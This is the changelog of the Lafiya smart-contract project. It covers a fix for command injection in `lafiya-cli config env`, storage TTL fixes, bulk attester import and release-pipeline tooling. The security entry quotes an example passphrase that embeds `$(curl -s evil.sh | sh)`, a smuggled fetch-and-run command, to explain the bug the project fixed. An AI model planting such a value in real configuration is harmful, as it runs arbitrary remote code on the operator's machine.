* **scripts:** remove eval-based command execution from smoke-test.sh ([c8fc229](https://github.com/Lafiya-xyz/Lafiya-contract/commit/c8fc229a1b1283cd92c1bbc76eb3724be4a210c3)), closes [#125](https://github.com/Lafiya-xyz/Lafiya-contract/issues/125)
* **scripts:** replace eval with safe array invocation and redact secrets in smoke-test.sh (closes [#125](https://github.com/Lafiya-xyz/Lafiya-contract/issues/125)) ([d3b033d](https://github.com/Lafiya-xyz/Lafiya-contract/commit/d3b033d269516826228fc4e2fffd9440f234cdd1))
* sync README contract tables and generated conformance catalogs ([447b1ee](https://github.com/Lafiya-xyz/Lafiya-contract/commit/447b1eecee03fafb310194a572b2f37b376dad96))
* **tooling:** restore CLI and stabilize tests ([7cede73](https://github.com/Lafiya-xyz/Lafiya-contract/commit/7cede732ce504e7baa6eea06e8494937cfd1e4ee))

## [Unreleased]

### Security

- **`lafiya-cli config env` command injection fix (issue #396).**
  Previously, `LAFIYA_RPC_URL`, `LAFIYA_ATTESTER_REGISTRY_ID`, and
  `LAFIYA_ATTESTATION_REGISTRY_ID` were printed unquoted, and
  `LAFIYA_NETWORK_PASSPHRASE` was formatted with Rust's `{:?}` Debug
  formatter which emits double-quoted strings — inside which the shell
  still expands `$(...)`, backticks, and `$VAR`.  A passphrase such as
  `Test $(curl -s evil.sh | sh) Network` would execute arbitrary commands
  in any shell that `eval`'d the output.  All values are now wrapped in
  POSIX single quotes (embedded `'` escaped as `'\''`), so the shell
  treats every character as a literal.
  `scripts/lib/config.sh` received the same fix via a new `shell_quote`
  helper and a `print_env_exports` function.

### Fixed

- **ARCH-01: `attester-registry` persistent storage TTL never extended
  (issue #04).** All state-mutating functions (`add_attester`,
  `add_attester_with_info`, `update_attester_info`, `add_attesters`,
  `suspend_attester`, `reinstate_attester`) now call
  `env.storage().persistent().extend_ttl(...)` on the `Attester(Address)`
  and `Suspended(Address)` keys they write, in addition to the
  already-present instance storage bumps.  Added two new constants —
  `PERSISTENT_BUMP_AMOUNT` (365 days / 6 307 200 ledgers) and
  `PERSISTENT_LIFETIME_THRESHOLD` (30 days / 518 400 ledgers) — that
  govern the per-attester persistent-entry rent window.  Without this
  fix, an allowlisted attester that was never touched by a subsequent
  admin operation would eventually have its storage entry evicted by
  Soroban's state-archival mechanism, causing `is_attester` to silently
  return `false` with no on-chain indication of why.

- **SEC-02: `multisig-account` had no path to extend its own TTL
  (issue #08).** Added a permissionless `keep_alive()` entry point that
  extends instance storage TTL without requiring authorization.
  `__check_auth` already bumps TTL on every authorized transaction, but
  an admin account used infrequently (e.g., once a month) could still
  have its `Threshold`/`Signer*` entries evicted between admin actions.
  `keep_alive()` lets off-chain monitoring jobs, cron scripts, or any
  caller prevent archival without needing a signer key.

### Added

- **`lafiya-cli attester import` — bulk CHW onboarding from CSV
  (issue #397).** New subcommand that reads a CSV of community health
  worker addresses (schema: `address,license_hash,region`), validates
  every row locally before touching the network (strkey checksum, 64-hex
  license hash, region charset), diffs against current chain state,
  groups new registrations into batches of ≤ 50, and writes a resumable
  JSON journal for crash recovery. `--dry-run` prints the full plan
  without submitting transactions; `--resume <journal>` reconciles
  previous journal entries on restart. New modules wired in:
  `crates/lafiya-cli/src/attester_import.rs` (CSV pipeline, diff, plan,
  journal, report), `crates/lafiya-cli/src/rpc_client.rs` (RPC client
  trait and native/stellar-cli stub implementations),
  `crates/lafiya-cli/src/signer.rs` (ed25519 signer abstraction).

- **`lafiya-cli config env --format <shell|dotenv|json>`** — operators can
  now avoid `eval` entirely by using `--format dotenv` with
  `set -a; source <(...)`, or `--format json` for scripting with `jq`.
- **`validate_passphrase`** in `lafiya-config` — rejects non-printable
  ASCII characters (control characters, null bytes) in
  `network_passphrase`.  Called by `config env` before any output is
  printed.

### Added

- Reproducible, provenance-carrying release pipeline: exact toolchain pin,
  `make wasm-reproducible` (pinned container) / `cargo xtask wasm --reproducible`,
  a CI double-build comparison, SEP-46/SEP-55 source metadata in every contract
  wasm, signed SLSA build provenance, release-please release PRs, and the
  `Schema-Impact:` trailer check. See `docs/releasing.md`.
- `cargo xtask` cross-platform task runner; the `Makefile` is now a thin shim.
- ADR-0010 and a prototype release manifest: `scripts/generate_release_manifest.py`
  binds contract wasm hashes, storage schema versions, generated bindings, event
  schemas, and per-network deployment state into one JSON document
  (`docs/release-manifest/schema.json`), with `scripts/validate_release_manifest.py`
  and `scripts/check_manifest_compatibility.py` to validate it and let downstream
  repositories check compatibility before pinning a release. See
  `docs/adr/0010-release-manifest-and-compatibility.md`.
- GitHub issue templates: bug report, feature request, and a security
  report template that directs reporters to `SECURITY.md` instead of
  accepting inline disclosures.
- Pull request template with a checklist matching the expectations in
  `CONTRIBUTING.md` (`make check` passes, tests added or updated,
  `CHANGELOG.md` updated).
- `SECURITY.md` security policy with a private reporting channel.
- `attester-registry`: `update_attester_info`, an admin-authorized entry
  point for changing an already-allowlisted attester's metadata without
  re-enrolling it. Emits `AttesterInfoUpdated`, which is distinguishable
  from `AttesterAdded`, and fails with the new `Error::AttesterNotFound`
  when the attester is not currently allowlisted (never added, or since
  removed).
- `attester-registry`: `get_attester_status`, a combined read returning an
  attester's metadata together with its current suspension state in one
  call.
- `attester-registry`: `set_max_attesters` and `get_max_attesters`, an
  admin-configurable soft cap on the number of allowlisted attesters
  (defaulting to 50,000). `add_attester`/`add_attester_with_info` fail with
  the new `Error::AllowlistFull` when the allowlist is at capacity and the
  attester is not already present; lowering the cap never evicts existing
  attesters, it only blocks further additions.
- `attester-registry`: `suspend_attester` and `reinstate_attester`, admin-
  authorized entry points for temporarily blocking an allowlisted attester
  from attesting without removing it. Suspended attesters fail
  `is_attester` until reinstated; emits `AttesterSuspended` and
  `AttesterReinstated` respectively.
